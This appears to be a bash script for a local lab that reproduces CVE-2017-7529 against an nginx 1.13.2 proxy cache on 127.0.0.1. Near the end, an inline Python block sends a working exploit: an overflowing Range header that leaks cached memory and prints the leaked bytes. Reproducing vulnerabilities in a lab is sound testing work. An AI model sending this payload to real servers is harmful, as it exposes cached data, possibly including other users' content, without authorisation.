#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
kill "$(cat "$LAB/7529.pid" 2>/dev/null)" 2>/dev/null || true
kill "$(cat "$LAB/static.pid" 2>/dev/null)" 2>/dev/null || true
sleep 1
nohup python3 "$LAB/backend-7529.py" >/tmp/be7529.log 2>&1 &
sleep 1
echo "=== proxy without cache ==="
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529-nocache.conf"
curl -s -D - -o /tmp/p1 -H "Range: bytes=0-10" http://127.0.0.1:17529/ | head -10
echo "body_len=$(wc -c </tmp/p1)"
echo "=== proxy with cache ==="
kill "$(cat "$LAB/7529.pid" 2>/dev/null)" 2>/dev/null || true
sleep 1
rm -rf "$LAB/cache"/*
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s -D - -o /tmp/p2 -H "Range: bytes=0-10" http://127.0.0.1:17529/ | head -10
echo "body_len=$(wc -c </tmp/p2)"
echo "=== malicious range on cache HIT ==="
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "exit=$?"
python3 <<PY
import requests
url="http://127.0.0.1:17529/"
r=requests.get(url)
cl=r.headers.get("Content-Length")
length=(int(cl) if cl else len(r.content))+623
hdr={"Range":"bytes=-%d,-9223372036854776000"%length}
r2=requests.get(url, headers=hdr)
print("CL", cl, "range", hdr["Range"])
print("status", r2.status_code, "len", len(r2.content))
print("206+Content-Range in body", r2.status_code==206 and b"Content-Range" in r2.content)
if r2.content!=r.content:
    print("leak preview", r2.content[:200])
PY
